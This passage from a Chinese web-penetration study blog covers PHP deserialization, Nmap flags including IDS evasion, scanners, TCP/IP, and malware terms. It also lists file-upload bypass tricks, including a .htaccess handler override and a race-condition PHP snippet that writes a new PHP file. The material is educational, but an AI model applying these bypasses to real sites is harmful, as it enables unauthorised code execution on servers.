<p>destruct()   当一个对象销毁时被调用，<br>toString()   当一个对象被当作一个字符串被调用。<br>wakeup()   使用unserialize时触发<br>sleep()    使用serialize时触发<br>destruct()    对象被销毁时触发<br>call()    在对象上下文中调用不可访问的方法时触发<br>callStatic()    在静态上下文中调用不可访问的方法时触发<br>get()    用于从不可访问的属性读取数据<br>set()    用于将数据写入不可访问的属性<br>isset()    在不可访问的属性上调用isset()或empty()触发<br>unset()     在不可访问的属性上使用unset()时触发<br>toString()    把类当作字符串使用时触发,返回值需要为字符串<br>invoke()   当脚本尝试将对象调用为函数时触发</p>
<h3 id="14-6、利用方法"><a href="#14-6、利用方法" class="headerlink" title="14.6、利用方法"></a>14.6、利用方法</h3><p>找到一个可以操作的变量$this-&gt;xxxx;<br>找到一个反序列化的地方（会执行序列化的点）<br>传参控制变量，并且触发魔术方法<br>a文件存在反序列化，且你能控制内容<br>a被很多文件包含了，那些包含了a文件的代码里面如果有类，都可以调用</p>
<h3 id="14-7、构造利用链"><a href="#14-7、构造利用链" class="headerlink" title="14.7、构造利用链"></a>14.7、构造利用链</h3><p>传参 -&gt; 反序列化函数【可能需要跳几层】<br>函数的使用必须被调用</p>
<h3 id="14-8、phar协议"><a href="#14-8、phar协议" class="headerlink" title="14.8、phar协议"></a>14.8、phar协议</h3><p>phar协议 会自动触发反序列化【读取文件的地方都能用】<br>反序列化的攻击代码放入phar文件，然后通过读取文件的方法去使用phar协议</p>
<h2 id="六、渗透扫描工具"><a href="#六、渗透扫描工具" class="headerlink" title="六、渗透扫描工具"></a>六、渗透扫描工具</h2><h3 id="1、Nmap"><a href="#1、Nmap" class="headerlink" title="1、Nmap"></a>1、Nmap</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
<h4 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h4><p><strong>主机发现</strong> </p>
<p>iR                                                                随机选择目标</p>
<p>-iL                                                                从文件中加载IP地址</p>
<p>-sL                                                               简单的扫描目标</p>
<p>-sn                                                               Ping扫描-禁用端口扫描</p>
<p>-Pn                                                              将所有主机视为在在线，跳过主机发现</p>
<p>-PS[portlist]                                              （TCP SYN ping） 需要root权限</p>
<p>-PA[portlist]                                              （TCP ACK ping）</p>
<p>-PU[portlist]                                              （UDP  ping）</p>
<p>-PY [portlist]                                             （SCTP ping）</p>
<p>-PE&#x2F;PP&#x2F;PM                                                 ICMP回显，时间戳和网络掩码请求探测</p>
<p>-PO[协议列表]                                            IP协议Ping</p>
<p>-n&#x2F;-R                                                           从不执行DNS解析&#x2F;始终解析[默认：有时]</p>
<p>–dns-servers                                              指定自定义DNS服务器</p>
<p>–system-dns                                              使用OS的dns服务器</p>
<p>–traceroute                                                跟踪到每个主机的跃点路径</p>
<p><strong>扫描技术</strong></p>
<p>-sS                                                             使用TCP的SYN进行扫描</p>
<p>-sT                                                             使用TCP进行扫描</p>
<p>-sA                                                            使用TCP的ACK进行扫描</p>
<p>-sU                                                            UDP扫描</p>
<p>-sI                                                             Idle扫描</p>
<p>-sF                                                            FIN扫描</p>
<p>-b&lt;FTP中继主机&gt;                                     FTP反弹扫描</p>
<p><strong>端口规格和扫描顺序</strong></p>
<p>-p                                                              扫描指定端口</p>
<p>–exclude-ports                                         从扫描中排除指定端口</p>
<p>-f                                                               快速模式-扫描比默认扫描更少的端口</p>
<p>-r                                                               连续扫描端口-不随机化</p>
<p>–top-ports                                                 扫描<number>最常用的端口</p>
<p><strong>服务&#x2F;版本探测</strong></p>
<p>-sV                                                            探测服务&#x2F;版本信息</p>
<p>–version-intensity                                     设置版本扫描强度（0-9）</p>
<p>–version-all                                              尝试每个强度探测</p>
<p>–version-trace                                          显示详细的版本扫描活动（用于调试）</p>
<p><strong>脚本扫描</strong></p>
<p>-SC                                                           等效于 –script&#x3D;defult</p>
<p>–script &#x3D; <lua scripts>,<lua scripts>        以逗号分隔的目录，脚本文件或脚本类别</p>
<p>–script-args &#x3D; &lt;n1&#x3D;v1, n2&#x3D;v2&gt;               为脚本提供参数</p>
<p>–script-args-file&#x3D;文件名                          从文件名中加载脚本参数</p>
<p>–script-trace                                            显示发送和接受的所有数据</p>
<p>–script-updatedb                                     更新脚本数据库</p>
<p>–script-help&#x3D;<lua scripts>                      显示有关脚本的帮助</p>
<p><strong>操作系统检测</strong></p>
<p>-o                                                            启用系统检测</p>
<p>–osscan-limit                                          将os检测限制为可能的目标</p>
<p>–osscan-guess                                       推测操作系统检测结果</p>
<p><strong>时间和性能</strong></p>
<p>–host-timeout                                         设置超时时间</p>
<p>–scan-delay                                           设置探测之间的时间间隔</p>
<p>-T  &lt;0-5&gt;                                                设置时间模板,值越小，IDS报警几率越低</p>
<p><strong>防火墙&#x2F;IDS规避和欺骗</strong></p>
<p>-f                                                             报文分段</p>
<p>-s                                                             欺骗源地址</p>
<p>-g                                                            使用指定的本机端口</p>
<p>–proxies &lt;url,port&gt;                                 使用HTTP&#x2F;SOCK4代理</p>
<p>-data<hex string>                                   想发送的数据包中追加自定义的负载</p>
<p>–data-string                                            将自定义的ACSII字符串附加到发送数据包中   </p>
<p>–data-length                                           发送数据包时，附加随机数据</p>
<p>–spoof-mac                                            MAC地址欺骗</p>
<p>–badsum                                                发送带有虚假TCP&#x2F;UNP&#x2F;STCP校验和的数据包</p>
<p><strong>输出</strong></p>
<p>-oN                                                         标准输出</p>
<p>-oX                                                         XMl输出</p>
<p>-oS                                                         script jlddi3</p>
<p>-oG                                                        grepable</p>
<p>-oA                                                         同时输出三种主要格式</p>
<p>-v                                                           信息详细级别</p>
<p>-d                                                           调试级别</p>
<p>–packet-trace                                        跟踪发送和接收的报文</p>
<p>–reason                                                 显示端口处于特殊状态的原因</p>
<p>–open                                                    仅显示开放的端口</p>
<p><strong>杂项</strong></p>
<p>-6                                                          启动Ipv6扫描</p>
<p>-A                                                          启动Os检测，版本检测，脚本扫描和traceroute</p>
<p>-V                                                          显示版本号</p>
<p>-h                                                          帮助信息</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>nmap -sn 192.168.3.74                <strong>扫描指定IP地址(ping 扫描)</strong></p>
<p>nmap 192.168.3.74 -p80             <strong>扫描主机的指定端口</strong></p>
<p>nmap -sS 192.168.3.74                <strong>使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，                         ACK。证明端口开放，不建立完整连接</strong>）</p>
<p>nmap -sT 192.168.3.74                <strong>使用TCP进行扫描（默认nmap扫描方式）</strong></p>
<p>nmap -sU 192.168.3.74                <strong>使用UDP进行扫描（扫描UDP开放的端口）</strong></p>
<p>nmap -sF 192.168.3.74                  <strong>有的时候TCP SYN不是最佳的扫描默认，目标主机可能有IDS&#x2F;IPS系统的存在，防火墙可能过滤掉SYN数据包。而发送一个FIN标志的数据包不需要完成TCP的握手</strong></p>
<p>nmap -sV 192.168.3.74                <strong>获得服务版本详细信息</strong></p>
<p> nmap -O 192.168.3.227              <strong>确定主机操作系统</strong></p>
<h3 id="2、AWVS"><a href="#2、AWVS" class="headerlink" title="2、AWVS"></a>2、AWVS</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>Acunetix Web Vulnerability Scanner （AWVS） 是一款Web漏洞扫描工具，用于检测Web应用程序中的安全漏洞。它提供了一种自动化的方法，帮助用户识别和修复Web应用程序中的常见漏洞，例如SQL注入、XSS、跨站请求伪造（CSRF）、身份验证漏洞等。</p>
<p>AWVS的扫描引擎在浏览Web应用程序时采用一系列技术，以识别漏洞并生成报告。报告提供详细的信息，包括漏洞位置、危险级别和建议的修复方案。这使得AWVS成为一个强大的工具，可以帮助信息安全专业人员识别并修复Web应用程序中的漏洞。</p>
<h4 id="Nessu简介"><a href="#Nessu简介" class="headerlink" title="Nessu简介"></a>Nessu简介</h4><p>Nessus是一款<strong>C&#x2F;S架构</strong>的漏洞扫描系统，作为一款漏洞扫描软件，不仅功能全面，而且还可以实时更新漏洞库，据统计有超过75,000个机构在使用它。</p>
<h4 id="Nessus优缺点有哪些"><a href="#Nessus优缺点有哪些" class="headerlink" title="Nessus优缺点有哪些"></a>Nessus优缺点有哪些</h4><p>优点：世界流行、有完整的漏扫服务、可随时更新漏洞库、<br>缺点：花钱、花钱、花钱（可以激活）</p>
<h3 id="4、Yakit-单兵渗透工具"><a href="#4、Yakit-单兵渗透工具" class="headerlink" title="4、Yakit(单兵渗透工具)"></a>4、Yakit(单兵渗透工具)</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>Yakit是基于Yak语言开发的网络安全单兵工具，Yakit 是一个高度集成化的 Yak 语言安全能力的安全测试平台，旨在打造一个覆盖渗透测试全流程的网络安全工具库。</p>
<h4 id="实际工作中Yakit的应用"><a href="#实际工作中Yakit的应用" class="headerlink" title="实际工作中Yakit的应用"></a><strong>实际工作中Yakit的应用</strong></h4><p>目前主要用来对cve漏洞的模拟，帮助研发人员更好的复现问题并 提升漏洞的修复效率</p>
<h3 id="5、Goby"><a href="#5、Goby" class="headerlink" title="5、Goby"></a>5、Goby</h3><p>Goby目前是使用Go语言开发、采用Electron+VUE前端框架的绿色版本，支持windows&#x2F;MacOS&#x2F;Linux，无需安装。</p>
<p>Goby是一款新的<strong>网络安全测试工具</strong>，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。他们希望通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。</p>
<h2 id="七、TCP-x2F-IP协议"><a href="#七、TCP-x2F-IP协议" class="headerlink" title="七、TCP&#x2F;IP协议"></a>七、TCP&#x2F;IP协议</h2><h3 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h3><p>物理层：如何用物理信号表示0和1，比特流传输<br>数据链路层：Mac地址寻址<br>网络层：IP寻址和路由选择<br>传输层：建立、维护、管理端到端连接<br>会话层：建立、维护、管理会话连接<br>表示层：数据格式化，加密、解密<br>应用层：为应用程序提供网络服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/zxczxc.png"
                     
                ></p>
<p><strong>IP协议（网际协议）</strong>：负责Internet上网络之间的通信，并规定了将数据从一个网络传输到另一个网络应遵循的规定，是TPC&#x2F;IP的核心。</p>
<p><strong>传输控制协议</strong>（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议</p>
<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>第一次握手：建立连接时，客户端发送syn包到服务器表示需要连接服务器；</p>
<p>第二次握手：服务器收到syn包，通过回应ack确认客户端连接，同时自己也发送一个SYN包表示要与客户端建立连接；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包后再向服务器发送确认包ACK以确认服务器发送的SYN，到此TCP三次握手建立成功。 </p>
<h3 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手"></a>TCP四次挥手</h3><p>由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这原则是当一方完成它的数据发送任务后就能发送一个FIN]来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p>
<p>（1） TCP客户端发送一个FIN，用来关闭客户到服务器的数据传送。</p>
<p>（2） 服务器收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。</p>
<p>（3） 服务器关闭客户端的连接，发送一个FIN给客户端。</p>
<p>（4） 客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</p>
<h3 id="TCP-x2F-IP四层模型"><a href="#TCP-x2F-IP四层模型" class="headerlink" title="TCP&#x2F;IP四层模型"></a>TCP&#x2F;IP四层模型</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/dfgfgsdfgsdf.png"
                     
                ></p>
<h1 id="AWVS绕过防火墙的方法"><a href="#AWVS绕过防火墙的方法" class="headerlink" title="AWVS绕过防火墙的方法"></a><strong>AWVS绕过防火墙的方法</strong></h1><p><strong>常见的AWVS绕过防火墙的方法，仅供学习和研究使用：</strong></p>
<ol>
<li>使用代理服务器：通过将扫描流量转发到一个代理服务器，再由代理服务器转发到目标网站，以此来绕过防火墙的过滤。可以使用一些公共代理服务器或自己搭建一个代理服务器。</li>
<li>使用隧道技术：通过使用一些隧道技术（如SSH隧道、VPN隧道等），将扫描流量通过隧道传输，绕过防火墙的检测。</li>
<li>使用HTTP隧道：使用HTTP隧道技术可以将扫描流量伪装成HTTP请求，然后通过HTTP隧道将扫描流量传输到目标网站，从而绕过防火墙的检测。</li>
<li>使用DNS隧道：类似于HTTP隧道，可以将扫描流量伪装成DNS请求，然后通过DNS隧道将扫描流量传输到目标网站，从而绕过防火墙的检测。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>文件上传绕过方式汇总</title>
    <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="文件上传的绕过方式"><a href="#文件上传的绕过方式" class="headerlink" title="文件上传的绕过方式"></a>文件上传的绕过方式</h1><h2 id="1、前对验证绕过"><a href="#1、前对验证绕过" class="headerlink" title="1、前对验证绕过"></a><strong>1、前对验证绕过</strong></h2><p>F12打开调试器关闭js格式实现绕过</p>
<h2 id="2、Content-Type方式绕过"><a href="#2、Content-Type方式绕过" class="headerlink" title="2、Content-Type方式绕过"></a><strong>2、Content-Type方式绕过</strong></h2><p>抓包修改Content-Type的数据为它允许的格式，如image&#x2F;jpeg</p>
<h2 id="3、黑名单绕过（不允许上传php）"><a href="#3、黑名单绕过（不允许上传php）" class="headerlink" title="3、黑名单绕过（不允许上传php）"></a><strong>3、黑名单绕过（不允许上传php）</strong></h2><p>可以上传php5、phtml后缀名，需要到Apache的配置文件，http.conf配置文件里面进行打开相应的配置：</p>
<p> AddType application&#x2F;x-httpd-php .php .phtml .php5 .pht</p>
<p>还有就是AllOverride all也要保证是打开的，默认的是none</p>
<h2 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a><strong>4、.htaccess文件绕过</strong></h2><p>编辑一个新的.htaccess文件，里面编辑:</p>
<p>&lt;FilesMatch “4.png”&gt;<br>SetHandler application&#x2F;x-httpd-php</p>
<p>这串代码的意思是如果文件中有一个4.png（是4.txt改后缀名实现的，不是图片马）的文件，他就会被解析为.php，把这个文件上传上去，然后紧接着上传4.png，这样就会把4.png当成php进行解析。</p>
<h2 id="5、后缀大小写"><a href="#5、后缀大小写" class="headerlink" title="5、后缀大小写"></a>5、后缀大小写</h2><h2 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h2><p>就在php.php后面加个空格就好了。</p>
<h2 id="7、文件后缀（点绕过）"><a href="#7、文件后缀（点绕过）" class="headerlink" title="7、文件后缀（点绕过）"></a>7、文件后缀（点绕过）</h2><p>就在php.php后面加个点就好了，如php.php.</p>
<h2 id="8、Windows文件流绕过（-DATA）"><a href="#8、Windows文件流绕过（-DATA）" class="headerlink" title="8、Windows文件流绕过（::$DATA）"></a>8、Windows文件流绕过（::$DATA）</h2><p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong>。例如:”test.php::$DATA”Windows会自动去掉末尾的::$DATA变成”test.php”。</p>
<h2 id="9、文件名双写绕过"><a href="#9、文件名双写绕过" class="headerlink" title="9、文件名双写绕过"></a>9、文件名双写绕过</h2><p>pphphp格式进行绕过</p>
<h2 id="10、后缀名绕过（点空格点）"><a href="#10、后缀名绕过（点空格点）" class="headerlink" title="10、后缀名绕过（点空格点）"></a>10、后缀名绕过（点空格点）</h2><h2 id="11、GET型00截断、POST型00截断"><a href="#11、GET型00截断、POST型00截断" class="headerlink" title="11、GET型00截断、POST型00截断"></a>11、GET型00截断、POST型00截断</h2><p>（<strong>PHP版本要在5.3.4</strong>以下且<strong>php的magic_quotes_gpc为OFF状态</strong>）</p>
<h2 id="12、条件竞争"><a href="#12、条件竞争" class="headerlink" title="12、条件竞争"></a>12、条件竞争</h2><p>这里的逻辑是先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除。这样就存在一个安全问题，那就是我同时上传多个相同文件，在它删除之前访问就可以了。也就是条件竞争问题。可以借助burp的暴力破解模块。</p>
<p>首先上传一个正常的符合条件的文件进行获取到上传路径，然后就在1.php里面编写内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;phpinfoshell.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></div>

<p>意思是如果没有找到phpinfoshell.php文件，则创建该文件，内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></div>

<p>让后通过bp抓包，进行null playd无限跑包，抓上传1.php包跑，跑了之后放包重新抓访问phpinfoshell.php包开始同时跑包，这样就可以通过条件竞争进行有概率的利用漏洞，在被删除之前访问1.php执行里面的file_put_contents函数创建phpinfoshell.php木马文件进行完美绕过。</p>
<h2 id="13、二次渲染"><a href="#13、二次渲染" class="headerlink" title="13、二次渲染"></a>13、二次渲染</h2><p>意思是上传了的图片马中的16进制的内容被进行渲染篡改成乱码了，我们要对比上传前和上传后的图片马16进制的地方，哪个地方没有被二次渲染，就在那个地方进行添加一句话木马，这样就可以绕过二次渲染实现上传成功。</p>
]]></content>
  </entry>
  <entry>
    <title>欢迎你的到来</title>
    <url>/2023/04/18/%E6%AC%A2%E8%BF%8E%E4%BD%A0/</url>
    <content><![CDATA[<h1 id="欢迎你"><a href="#欢迎你" class="headerlink" title="欢迎你"></a>欢迎你</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/2030300.jpg"
                     
                ></p>
<p>感谢各位靓仔靓妹来到本人的博客，鄙人不才，现在主攻Web渗透方向，还是小白，但是一直在路上，俗话说的好，“不积跬步无以至千里，不积小流无以成江河，道阻且长，行则将至”，做好自己，相信未来。</p>
<div class="note-large notel-default"><div class="notel-title"><p>信息</p>
</div><div class="notel-content"><p>如有指教，请加QQ：1500076625，在此表示感谢。</p>
 </div></div>]]></content>
  </entry>
  <entry>
    <title>病毒名词解释</title>
    <url>/2022/12/08/%E7%97%85%E6%AF%92%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<h2 id="恶意软件-内部俗称“僵木蠕”"><a href="#恶意软件-内部俗称“僵木蠕”" class="headerlink" title="恶意软件(内部俗称“僵木蠕”)"></a>恶意软件(内部俗称“僵木蠕”)</h2><p>指在计算机系统上执行恶意任务的病毒、蠕虫、特洛伊木马、后门、僵尸网络、Rootkit、逻辑炸弹、间谍软件、广告软件。</p>
<h3 id="恶意软件危害"><a href="#恶意软件危害" class="headerlink" title="恶意软件危害"></a><strong>恶意软件危害</strong></h3><p><strong>1、破坏计算机数据</strong></p>
<pre><code>  计算机病毒激发后会通过格式化、改写、删除、破坏设置等破坏计算机储存数据
</code></pre>
<p><strong>2、窃取用户隐私信息</strong></p>
<pre><code>  如银行密码、账户密码等用户隐私信息,盗用用户财产
</code></pre>
<p><strong>3、利用被病毒控制的用户计算机进行非法行为</strong></p>
<pre><code> 如利用僵尸主机发起DDOS攻击
</code></pre>
<p>4<strong>、占用计算机空间、抢占硬件资源</strong></p>
<pre><code>  如挖矿木马，占用用户计算资源进行虚拟货币挖矿
</code></pre>
<h3 id="恶意软件特性"><a href="#恶意软件特性" class="headerlink" title="恶意软件特性"></a>恶意软件特性</h3><p>自启动特性</p>
<p>恶意软件行为特征</p>
<p>下载和后门特性</p>
<p>信息收集特性</p>
<p>隐藏特性</p>
<p>文件感染特性</p>
<p>网络攻击特性</p>
<h2 id="常见的恶意软件"><a href="#常见的恶意软件" class="headerlink" title="常见的恶意软件"></a><strong>常见的恶意软件</strong></h2><h3 id="1、勒索软件"><a href="#1、勒索软件" class="headerlink" title="1、勒索软件"></a>1、勒索软件</h3><p>通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财</p>
<p>​		具有代表性的勒索软件：WannaCry利用Windows操作系统445端口存在的漏洞进行传播，并具有自我复制、主动传播的特性，被改软件加密后的文件的后缀名会被统一改成 “.WNCRY” 。</p>
<h3 id="2、DDOS木马"><a href="#2、DDOS木马" class="headerlink" title="2、DDOS木马"></a>2、DDOS木马</h3><p>黑客可向指定ip发送DDOS攻击，影响企业的正常业务</p>
<p>​		代表木马：盖茨木马（Linux型木马），此类Linux木马主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。</p>
<p>​		其余木马：DDoS_XOR、DbSecuritySpt</p>
<h3 id="3、蠕虫病毒"><a href="#3、蠕虫病毒" class="headerlink" title="3、蠕虫病毒"></a>3、蠕虫病毒</h3><p>计算机蠕虫不需要附在别的程序内，可能不用使用者介入操作也能自我复制或执行，未必会直接破坏被感染的系统，却几乎都对网络有害。但也有直接破坏系统资源的蠕虫病毒，如WannaCry。</p>
<p>​		代表病毒：熊猫烧香，一款拥有自动传播、自动感染硬盘能力和强大的破坏能力的病毒，它不但能感染系统中exe，com，pif，src，html，asp等文件，它还能中止大量的反病毒软件进程并且会删除扩展名为gho的文件。</p>
<p>​		其余蠕虫：红色代码、超级病毒、WannaCry</p>
<h3 id="4、挖矿木马"><a href="#4、挖矿木马" class="headerlink" title="4、挖矿木马"></a>4、挖矿木马</h3><p>​	黑客通过木马控制大量肉鸡电脑，为其制造虚拟货币，占用大量的系统资源.</p>
<p>​		典型的挖矿木马：ddg</p>
<p>​		1、对可以未授权访问redis的服务器写入公钥登录，定时下载并执行脚本；</p>
<p>​		2、脚本下载AnXqV和ddg文件并运行，AnXqV进行挖矿，ddg进行系统监控远程调用并内网传播。</p>
<p>​		其余挖矿木马：Linux.MulDrop.14、minerd</p>
<h3 id="5、恶意软件处置"><a href="#5、恶意软件处置" class="headerlink" title="5、恶意软件处置"></a>5、恶意软件处置</h3><p>​		1、杀毒软件</p>
<p>​		2、重装系统</p>
<p>​		3、系统还原</p>
<p>​		4、Ghost还原</p>
<p>处理过程包括修复病毒修改的注册表&#x2F;文件内容和删除病毒文件两部分，注册表有启动项检查、服务检查、检查Winlogon加载项、检查其他加载项，还有检测可疑文件（使用一些常用工具进行加检测HijackThis、Process Explorer、PCHunter、火绒剑、ProcessHacker、Autoruns）</p>
<h2 id="电脑病毒"><a href="#电脑病毒" class="headerlink" title="电脑病毒"></a><strong>电脑病毒</strong></h2><p>一种能把自己(或经演变)注入其它程序的计算机程序,启动区病毒,宏(macro)病毒,脚本(script)病毒也是相同概念</p>
<p><strong>1、病毒工作三部曲</strong></p>
<p>​		1.住进阶段: 执行被感染的程序,病毒就加载入计算机内存</p>
<p>​		2.感染阶段: 病毒把自己注入其他程序,包括远程文件</p>
<p>​		3.执行阶段: 当某些条件成熟时, 一些病毒会有一些特别的行为. 例如重新启动,删除文件</p>
<p><strong>2、特点</strong></p>
<p>​		  传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性都很强</p>
<h3 id="1、宏病毒"><a href="#1、宏病毒" class="headerlink" title="1、宏病毒"></a>1、宏病毒</h3><p><strong>定义：</strong>宏病毒是一种寄存在<strong>文档</strong>或<strong>模板</strong>的宏中的<strong>计算机病毒</strong>。一旦打开这样的文档，其中的宏就会被<strong>执行</strong>，于是宏病毒就会被激活，转移到计算机上，并驻留在<strong>Normal模板上</strong>。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的<strong>计算机</strong>上。</p>
<h3 id="2、蠕虫"><a href="#2、蠕虫" class="headerlink" title="2、蠕虫"></a>2、蠕虫</h3><p>蠕虫是一种能够利用系统漏洞通过网络进行自我传播的恶意程序。它是利用网络进行复制和传播，传染途径是通过网络和电子邮件。</p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p> 计算机蠕虫不需要附在别的程序内，可能不用使用者介入操作也能自我复制或执行，未必会直接破坏被感染的系统，却几乎都对网络有害。</p>
<h3 id="3、木马"><a href="#3、木马" class="headerlink" title="3、木马"></a>3、木马</h3><p>木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，表面上没有危害、甚至还附有用户需要的功能，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。</p>
<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>占用空间小、运行后较难阻止其行为、隐蔽性高</p>
<h3 id="4、Rootkit"><a href="#4、Rootkit" class="headerlink" title="4、Rootkit"></a>4、Rootkit</h3><p>用于修改操作系统，以改变操作系统的表现行为的工具软件 。而这种改变，往往不是操作系统设计时所期望的。 广义而言，Rootkit也可视为一项技术，恶意软件利用该项技术来达到隐藏自身的目的。</p>
<h2 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a><strong>僵尸网络</strong></h2><h3 id="1、僵尸（Bot）"><a href="#1、僵尸（Bot）" class="headerlink" title="1、僵尸（Bot）"></a>1、僵尸（Bot）</h3><p>一种集后门与蠕虫一体的恶意程序. 通常使用IRC (Internet Relay Chat) 接受和执行黑客命令</p>
<h3 id="2、僵尸网络（Botnet）"><a href="#2、僵尸网络（Botnet）" class="headerlink" title="2、僵尸网络（Botnet）"></a>2、僵尸网络（Botnet）</h3><p>将大量主机感染bot程序（僵尸程序）病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。</p>
<h2 id="DNS污染"><a href="#DNS污染" class="headerlink" title="DNS污染"></a>DNS污染</h2><p>指一些刻意制造或无意中制造出来的<strong>域名服务器数据包</strong>，把域名指往不正确的IP地址。</p>
<h2 id="NGAF-x2F-AF（深信服下一代防火墙）"><a href="#NGAF-x2F-AF（深信服下一代防火墙）" class="headerlink" title="NGAF&#x2F;AF（深信服下一代防火墙）"></a>NGAF&#x2F;AF（深信服下一代防火墙）</h2><p>NGAF和AF是一样的，以前叫AF，现在叫NGAF，都是一样的，同一个东西。</p>
<p>专注网络边界安全效果，通过应用丰富的安全创新防御技术和简单易用的产品设计理念，不仅增强网络边界的安全检测与防控能力，而且实现网络安全风险可视化展示与快速处置，让组织网络边界安全建设更有效、更简单。</p>
<p>产品系列：</p>
<p><strong>AF-1000-FH系列</strong></p>
<p>适用于互联网出口边界安全防御、内网边界隔离、数据中心边界防护、广域安全组网。</p>
<p><strong>AF-2000-FH系列</strong></p>
<p>适用于互联网出口边界安全防御、内网边界隔离、数据中心边界防护、广域安全组网。</p>
<p>mss平台</p>
<p>EDR</p>
<p>SIP</p>
<p>云镜</p>
<p>态势感知</p>
<p>零信任</p>
<p>XDR</p>
<p>AC（上网行为管理）</p>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>内存马是指一种只在内存中运行，没有文件落地或者运行后能够删除自身的木马。</p>
<h2 id="判断网页是否为伪静态"><a href="#判断网页是否为伪静态" class="headerlink" title="判断网页是否为伪静态"></a>判断网页是否为伪静态</h2><p>使用javascript:alert(document.lastModified)</p>
<p>看弹出的时间是否会变化，变化则是伪静态，不变则是静态。</p>
<h2 id="常见的字符集-amp-字符编码"><a href="#常见的字符集-amp-字符编码" class="headerlink" title="常见的字符集&amp;字符编码"></a>常见的字符集&amp;字符编码</h2><p>计算机中储存的信息都是用<strong>二进制</strong>数表示的；<br>而我们在屏幕上看到的<strong>英文、汉字</strong>等字符是<strong>二进制数转换</strong>之后的结果。<br>通俗的说，按照<strong>何种规则</strong>将字符<strong>存储在计算机中</strong>，如’a’用什么表示，称为”<strong>编码</strong>“；<br>反之，将存储在计算机中的二进制数<strong>解析</strong>显示出来，称为”<strong>解码</strong>“，如同密码学中的加密和解密。<br>在解码过程中，如果<strong>使用</strong>了<strong>错误</strong>的解码<strong>规则</strong>，则导致’a’解析成’b’或者<strong>乱码</strong>。</p>
<h3 id="1、GBK编码-计算机编码"><a href="#1、GBK编码-计算机编码" class="headerlink" title="1、GBK编码(计算机编码)"></a>1、GBK编码(计算机编码)</h3><p>GBK全称《汉字内码扩展规范》，中文名是<strong>汉字编码字符集</strong></p>
<h3 id="2、UNICODE编码"><a href="#2、UNICODE编码" class="headerlink" title="2、UNICODE编码"></a>2、UNICODE编码</h3><p>以**\u、\u+、&amp;#x、&amp;#**开头，比如：\u0031\u0038\</p>
<h3 id="3、16进制编码"><a href="#3、16进制编码" class="headerlink" title="3、16进制编码"></a>3、16进制编码</h3><p>​			以<strong>\x</strong>开头</p>
